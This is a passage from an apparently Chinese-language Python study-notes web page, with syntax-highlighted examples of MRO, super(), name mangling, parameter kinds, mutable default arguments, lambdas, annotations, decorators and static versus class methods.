class="line"><span class="built_in">print</span>(B()) <span class="comment"># G=1 A.X=2 self.X=20 self.m=30</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="Method-resolution-order-MRO"><a href="#Method-resolution-order-MRO" class="headerlink" title="Method resolution order (MRO)"></a>Method resolution order (MRO)</h2><p><a href="https://realpython.com/python-super">Supercharge Your Classes With Python super()</a><br><a href="https://stackoverflow.com/questions/8972866/correct-way-to-use-super-argument-passing">correct way to use super (argument passing)</a></p>
<ul>
<li><code>super()</code>返回父类的临时对象，允许通过它调用父类方法</li>
<li>MRO是指编程语言支持多重继承时解析方法或属性的顺序的一种算法</li>
<li>Python2算法：depth-first left to right algorithm (DLR)</li>
<li>Python3算法：<a href="https://en.wikipedia.org/wiki/C3_linearization">C3 Linearization algorithm</a></li>
<li>类属性访问顺序（优先级依次递减）：<ol>
<li>instance attribute</li>
<li>class attribute</li>
<li>base class as determined by MRO</li>
</ol>
</li>
</ul>
<div class="tabs" id="mro"><ul class="nav-tabs"><li class="tab active"><a href="#mro-1">MRO</a></li><li class="tab"><a href="#mro-2">super</a></li></ul><div class="tab-content"><div class="tab-pane active" id="mro-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;[Diamond inheritance]</span></span><br><span class="line"><span class="string">      A</span></span><br><span class="line"><span class="string">     / \ </span></span><br><span class="line"><span class="string">    B   C</span></span><br><span class="line"><span class="string">     \ /</span></span><br><span class="line"><span class="string">      D</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">rk</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;In class A&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">rk</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;In class B&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">rk</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;In class C&quot;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(B, C):</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(D.__mro__) <span class="comment"># (&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span></span><br><span class="line"><span class="built_in">print</span>(D.mro())   <span class="comment"># [&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;]</span></span><br><span class="line">d = D()</span><br><span class="line">d.rk()   <span class="comment"># In class B</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="mro-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">First</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;First&quot;</span>, kwargs)  <span class="comment"># First &#123;&#x27;a&#x27;: 1&#125;</span></span><br><span class="line">        self.a = kwargs.pop(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        <span class="built_in">super</span>(First, self).__init__(**kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Second</span>(<span class="title class_ inherited__">First</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Second&quot;</span>, kwargs) <span class="comment"># Second &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2&#125;</span></span><br><span class="line">        self.b = kwargs.pop(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">        <span class="built_in">super</span>(Second, self).__init__(**kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Third</span>(<span class="title class_ inherited__">Second</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Third&quot;</span>, kwargs)  <span class="comment"># Third &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;</span></span><br><span class="line">        self.c = kwargs.pop(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">        <span class="built_in">super</span>(Third, self).__init__(**kwargs)</span><br><span class="line"></span><br><span class="line">third = Third(a=<span class="number">1</span>, b=<span class="number">2</span>, c=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h2><ul>
<li>Python不支持像C++&#x2F;Java中的<code>private</code>变量，暴露类成员变量并不是坏事；</li>
<li>通过<code>@property</code>修饰符可以在不改变现有代码的基础上，封装新的成员变量；</li>
<li>类中<code>_</code>开头的方法或变量，暗指不是类的public api，实际依然可以用，但不保证兼容性；</li>
<li>类中<code>__</code>开头的变量是”class local”，避免被子类重写，运行时会自动混淆名称，例如：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__foobar = <span class="literal">None</span> <span class="comment"># will be automatically mangled to self._A__foobar</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.__foobar = <span class="number">1</span> <span class="comment"># will be automatically mangled to self._B__foobar</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h2><h3 id="positional-vs-keyword"><a href="#positional-vs-keyword" class="headerlink" title="positional vs keyword"></a>positional vs keyword</h3><p><a href="https://docs.python.org/3/tutorial/controlflow.html#special-parameters">Functions - Special parameters</a></p>
<ul>
<li><code>/</code>（可选）之前的参数必须是位置参数（Positional）</li>
<li><code>*</code>（可选）之后的参数必须是关键字参数（keyword）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">pos1, pos2, /, pos_or_kwd, *, kwd1, kwd2</span>):</span><br><span class="line">      -----------    ----------     ----------</span><br><span class="line">        |             |                  |</span><br><span class="line">        |        Positional <span class="keyword">or</span> keyword   |</span><br><span class="line">        |                                - Keyword only</span><br><span class="line">         -- Positional only</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pos_only_arg</span>(<span class="params">arg, /</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">kwd_only_arg</span>(<span class="params">*, arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">combined_arg</span>(<span class="params">pos_only, /, standard, *, kwd_only</span>):</span><br><span class="line">    <span class="built_in">print</span>(pos_only, standard, kwd_only)</span><br><span class="line"></span><br><span class="line">standard_arg(<span class="number">1</span>)       <span class="comment"># 1</span></span><br><span class="line">standard_arg(arg=<span class="number">1</span>)   <span class="comment"># 1</span></span><br><span class="line">pos_only_arg(<span class="number">2</span>)       <span class="comment"># 2</span></span><br><span class="line">pos_only_arg(arg=<span class="number">2</span>)   <span class="comment"># TypeError: pos_only_arg() got some positional-only arguments passed as keyword arguments: &#x27;arg&#x27;</span></span><br><span class="line">kwd_only_arg(<span class="number">3</span>)       <span class="comment"># TypeError: kwd_only_arg() takes 0 positional arguments but 1 was given</span></span><br><span class="line">kwd_only_arg(arg=<span class="number">3</span>)   <span class="comment"># 3</span></span><br><span class="line">combined_arg(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)                            <span class="comment"># TypeError: combined_arg() takes 2 positional arguments but 3 were given</span></span><br><span class="line">combined_arg(<span class="number">1</span>, <span class="number">2</span>, kwd_only=<span class="number">3</span>)                   <span class="comment"># 1 2 3</span></span><br><span class="line">combined_arg(<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)          <span class="comment"># 1 2 3</span></span><br><span class="line">combined_arg(pos_only=<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>) <span class="comment"># TypeError: combined_arg() got some positional-only arguments passed as keyword arguments: &#x27;pos_only&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo1</span>(<span class="params">name, **kwds</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo2</span>(<span class="params">name, /, **kwds</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds)</span><br><span class="line"></span><br><span class="line">foo1(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)   <span class="comment"># TypeError: foo() got multiple values for argument &#x27;name&#x27;</span></span><br><span class="line">foo2(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)   <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo3</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, b) <span class="comment"># 1 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo4</span>(<span class="params">a, **kwds</span>):</span><br><span class="line">    <span class="built_in">print</span>(a, kwds) <span class="comment"># 1 &#123;&#x27;c&#x27;: 3, &#x27;b&#x27;: 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(foo3(**&#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;))      <span class="comment"># None</span></span><br><span class="line"><span class="built_in">print</span>(foo4(c=<span class="number">3</span>, **&#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;)) <span class="comment"># None</span></span><br></pre></td></tr></table></figure>

<h3 id="argument-vs-parameter"><a href="#argument-vs-parameter" class="headerlink" title="argument vs parameter"></a>argument vs parameter</h3><p><a href="https://docs.python.org/3/reference/expressions.html#calls">Expressions - Primaries - calls</a></p>
<ul>
<li>argument: 实际参数，支持尾逗号、可变参数、默认参数<ul>
<li>positional argument 位置参数<ul>
<li><code>*expression</code>表示表达式作为iterable对象解析成附加的positional argument</li>
<li><code>*expression</code>附加参数优先于keyword argument（无论表达式处于参数首部或尾部）</li>
</ul>
</li>
<li>keyword argument 关键字参数<ul>
<li><code>**expression</code>表示表达式作为mapping对象解析成附加的keyword argument</li>
</ul>
</li>
</ul>
</li>
<li>formal parameter 形式参数<ul>
<li><code>*identifier</code>表示接受一个包含多余positional argument的tuple</li>
<li><code>**identifier</code>表示接受一个包含多余keyword argument的dict</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a, b, *c, **d</span>):         <span class="comment"># (parameter, ..., *identifier , **identifier )</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(c), <span class="built_in">type</span>(d))   <span class="comment"># &lt;class &#x27;tuple&#x27;&gt; &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line">    <span class="built_in">print</span>(a, b, c, d)</span><br><span class="line"></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>)          <span class="comment"># 1 2 () &#123;&#125;     (positional, positional)</span></span><br><span class="line"><span class="comment">#f(a=1, *(2,))   # TypeError: f() got multiple values for argument &#x27;a&#x27;</span></span><br><span class="line">f(b=<span class="number">1</span>, *(<span class="number">2</span>,))    <span class="comment"># 2 1 () &#123;&#125;     (keyword, *expression)</span></span><br><span class="line">f(<span class="number">1</span>, *(<span class="number">2</span>,))      <span class="comment"># 1 2 () &#123;&#125;     (positional, *expression)</span></span><br><span class="line">f(<span class="number">1</span>, *(<span class="number">2</span>,<span class="number">3</span>))     <span class="comment"># 1 2 (3,) &#123;&#125;   (positional, *expression)</span></span><br><span class="line">f(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)       <span class="comment"># 1 2 (3,) &#123;&#125;   (positional, *expression)</span></span><br><span class="line">f(<span class="number">1</span>, *(<span class="number">2</span>,<span class="number">3</span>), **&#123;<span class="string">&#x27;x&#x27;</span>:<span class="number">4</span>,&#125;)  <span class="comment"># 1 2 (3,) &#123;&#x27;x&#x27;: 4&#125; (positional, *expression, **expression)</span></span><br><span class="line">f(**&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;)  <span class="comment"># 1 2 () &#123;&#x27;c&#x27;: 3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f2</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(args), args)</span><br><span class="line"></span><br><span class="line">f2(*(<span class="number">2</span>,)) <span class="comment"># &lt;class &#x27;tuple&#x27;&gt; (2,)    GOOD</span></span><br><span class="line">f2((<span class="number">2</span>,))  <span class="comment"># &lt;class &#x27;tuple&#x27;&gt; ((2,),) BAD</span></span><br></pre></td></tr></table></figure>

<h3 id="default-parameter"><a href="#default-parameter" class="headerlink" title="default parameter"></a>default parameter</h3><p><a href="https://docs.python.org/3/reference/compound_stmts.html#function-definitions">Compound statements - Function definitions</a></p>
<ul>
<li>default parameter 默认参数<ul>
<li>如果一个参数有默认值，那么向右到<code>*expression</code>表达式之前的所有参数也必须有默认值</li>
<li>默认参数为mutable对象（list、dict）时，如果函数修改了此对象，默认参数的值也随之被修改，因此mutable对象的默认参数常用None代替</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_default_list</span>(<span class="params">l=[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], v=<span class="number">3</span></span>):   <span class="comment"># Bad</span></span><br><span class="line">    l.append(v)</span><br><span class="line">    <span class="built_in">print</span>(l)</span><br><span class="line"></span><br><span class="line">func_default_list([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], <span class="number">100</span>)  <span class="comment"># [0, 0, 0, 100]</span></span><br><span class="line">func_default_list() <span class="comment"># [0, 1, 2, 3]</span></span><br><span class="line">func_default_list() <span class="comment"># [0, 1, 2, 3, 3]</span></span><br><span class="line">func_default_list() <span class="comment"># [0, 1, 2, 3, 3, 3]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_default_list_none</span>(<span class="params">l=<span class="literal">None</span>, v=<span class="number">3</span></span>):   <span class="comment"># Good</span></span><br><span class="line">    <span class="keyword">if</span> l <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        l = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">    l.append(v)</span><br><span class="line">    <span class="built_in">print</span>(l)</span><br><span class="line"></span><br><span class="line">func_default_list_none() <span class="comment"># [0, 1, 2, 3]</span></span><br><span class="line">func_default_list_none() <span class="comment"># [0, 1, 2, 3]</span></span><br></pre></td></tr></table></figure>

<h3 id="lambda-expression"><a href="#lambda-expression" class="headerlink" title="lambda expression"></a>lambda expression</h3><p><a href="https://realpython.com/python-lambda/">How to Use Python Lambda Functions</a></p>
<ul>
<li>lambda表达式用于代替小的匿名函数，语法上被限制为一个表达式，语义上只是普通函数定义的语法糖。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_incrementor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> x: x * n</span><br><span class="line"></span><br><span class="line">f = make_incrementor(<span class="number">11</span>)</span><br><span class="line"><span class="built_in">print</span>(f(<span class="number">1</span>), f(<span class="number">2</span>), f(<span class="number">3</span>))  <span class="comment"># 11 22 33</span></span><br><span class="line"></span><br><span class="line">L = [(<span class="number">4</span>, <span class="string">&#x27;d&#x27;</span>), (<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>), (<span class="number">3</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>)]</span><br><span class="line">L.sort(key=<span class="keyword">lambda</span> pair: pair[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(L)  <span class="comment"># [(1, &#x27;a&#x27;), (2, &#x27;b&#x27;), (3, &#x27;c&#x27;), (4, &#x27;d&#x27;)]</span></span><br></pre></td></tr></table></figure>

<h3 id="annotations"><a href="#annotations" class="headerlink" title="annotations"></a>annotations</h3><p><a href="https://docs.python.org/3/tutorial/controlflow.html#function-annotations">Function Annotations</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a: <span class="built_in">str</span>, b: <span class="built_in">int</span> = <span class="number">123</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(f.__annotations__) <span class="comment"># &#123;&#x27;a&#x27;: &lt;class &#x27;str&#x27;&gt;, &#x27;b&#x27;: &lt;class &#x27;int&#x27;&gt;, &#x27;return&#x27;: &lt;class &#x27;str&#x27;&gt;&#125;</span></span><br><span class="line">    <span class="keyword">return</span> a + <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f(<span class="string">&#x27;abc&#x27;</span>))  <span class="comment"># abc-123</span></span><br></pre></td></tr></table></figure>

<h1 id="修饰器（decorator）"><a href="#修饰器（decorator）" class="headerlink" title="修饰器（decorator）"></a>修饰器（decorator）</h1><p><a href="https://stackoverflow.com/questions/17330160/how-does-the-property-decorator-work-in-python">How does the @property decorator work in Python?</a></p>
<p>对已经定义的函数增加一些额外的功能。</p>
<div class="tabs" id="decorator"><ul class="nav-tabs"><li class="tab active"><a href="#decorator-1">nested_func</a></li><li class="tab"><a href="#decorator-2">decorator_func</a></li><li class="tab"><a href="#decorator-3">decorator_class</a></li></ul><div class="tab-content"><div class="tab-pane active" id="decorator-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decorator_func</span>(<span class="params">fun</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper_func</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrapper function started&quot;</span>)</span><br><span class="line">        fun()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Given function decorated&quot;</span>)</span><br><span class="line">        <span class="comment"># Wrapper function add something to the passed function </span></span><br><span class="line">        <span class="comment"># and decorator returns the wrapper function</span></span><br><span class="line">    <span class="keyword">return</span> wrapper_func</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_bye</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bye!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">say_bye = decorator_func(say_bye)</span><br><span class="line">say_bye()</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="decorator-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decorator_func</span>(<span class="params">fun</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper_func</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrapper function started&quot;</span>)</span><br><span class="line">        fun()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Given function decorated&quot;</span>)</span><br><span class="line">        <span class="comment"># Wrapper function add something to the passed function </span></span><br><span class="line">        <span class="comment"># and decorator returns the wrapper function</span></span><br><span class="line">    <span class="keyword">return</span> wrapper_func</span><br><span class="line"></span><br><span class="line"><span class="meta">@decorator_func</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_bye</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bye!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">say_bye()</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="decorator-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContextDecorator</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, foo, bar</span>):</span><br><span class="line">        self.foo = foo</span><br><span class="line">        self.bar = bar</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;init&quot;</span>, foo, bar)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, f</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call&quot;</span>)</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">wrapped_f</span>():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;about to call&quot;</span>)</span><br><span class="line">            f()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;done calling&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> wrapped_f</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;enter&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_val, exc_tb</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;exit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># with语句触发 __enter__() 和 __exit__()</span></span><br><span class="line"><span class="keyword">with</span> ContextDecorator(<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;with&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修饰符等价于 ContextDecorator(3, 4)(sample)，触发__call__()</span></span><br><span class="line"><span class="meta">@ContextDecorator(<span class="params"><span class="number">3</span>, <span class="number">4</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sample</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sample&quot;</span>)</span><br><span class="line"></span><br><span class="line">sample()</span><br></pre></td></tr></table></figure></div></div></div>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python nested_func.py | python decorator_func.py</span><br><span class="line">Wrapper function started</span><br><span class="line">bye!!</span><br><span class="line">Given function decorated</span><br><span class="line"></span><br><span class="line">$ python decorator_class.py</span><br><span class="line">init 1 2</span><br><span class="line">enter</span><br><span class="line">with</span><br><span class="line">exit</span><br><span class="line">init 3 4</span><br><span class="line">call</span><br><span class="line">about to call</span><br><span class="line">sample</span><br><span class="line">done calling</span><br></pre></td></tr></table></figure>

<h2 id="staticmethod-vs-classmethod"><a href="#staticmethod-vs-classmethod" class="headerlink" title="@staticmethod vs @classmethod"></a>@staticmethod vs @classmethod</h2><p><a href="https://stackoverflow.com/questions/136097/difference-between-staticmethod-and-classmethod">Difference between staticmethod and classmethod</a></p>
<ul>
<li>使用场景:<ul>
<li>当方法只适合通过当前对象操作时，用instancemethod；</li>
<li>@classmethod：当方法实现中调用了类中其他的变量或方法时，用来代替构造函数或继承关系中；</li>
<li>@staticmethod：当方法实现中不涉及类的其他部分，只是把功能独立的函数放入类中管理。</li>
</ul>
</li>
<li>第一个参数：<ul>
<li>instancemethod：当前对象自动作为第一个参数传递；</li>
<li>@classmethod: 当前对象的类自动作为第一个参数传递；</li>
<li>@staticmethod: 不会自动传递任何参数。</li>
</ul>
</li>
</ul>
<div class="tabs" id="classmethod_vs_staticmethod"><ul class="nav-tabs"><li class="tab active"><a href="#classmethod_vs_staticmethod-1">accessImpl</a></li><li class="tab"><a href="#classmethod_vs_staticmethod-2">inheritance</a></li><li class="tab"><a href="#classmethod_vs_staticmethod-3">callMethod</a></li></ul><div class="tab-content"><div class="tab-pane active" id="classmethod_vs_staticmethod-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> cos, sin, atan, pi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y</span>):</span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">frompolar</span>(<span class="params">cls, radius, angle</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        The `cls` argument is the `Point` class itself</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> cls(radius * cos(angle), radius * sin(angle))</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">angle</span>(<span class="params">x, y</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        this could be outside the class, but we put it here just</span></span><br><span class="line"><span class="string">        because we think it is logically related to the class.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> atan(y/x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = Point(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line">p2 = Point.frompolar(<span class="number">3</span>, pi/<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">angle = Point.angle(<span class="number">3</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="classmethod_vs_staticmethod-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">use @staticmethod, print_name method should be written twice。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>:</span><br><span class="line">   _class_name = <span class="string">&quot;Parent&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">   @staticmethod</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">print_name</span>():</span><br><span class="line">       <span class="built_in">print</span>(Parent._class_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span>(<span class="title class_ inherited__">Parent</span>):</span><br><span class="line">   _class_name = <span class="string">&quot;Child&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">   @staticmethod</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">print_name</span>():</span><br><span class="line">       <span class="built_in">print</span>(Child._class_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parent.print_name()</span><br><span class="line">Child.print_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">use @classmethod, it is not required to write print_name method twice.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span>:</span><br><span class="line">    _class_name = <span class="string">&quot;Parent&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_name</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(cls._class_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span>(<span class="title class_ inherited__">Parent</span>):</span><br><span class="line">    _class_name = <span class="string">&quot;Child&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parent.print_name()</span><br><span class="line">Child.print_name()</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="classmethod_vs_staticmethod-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span 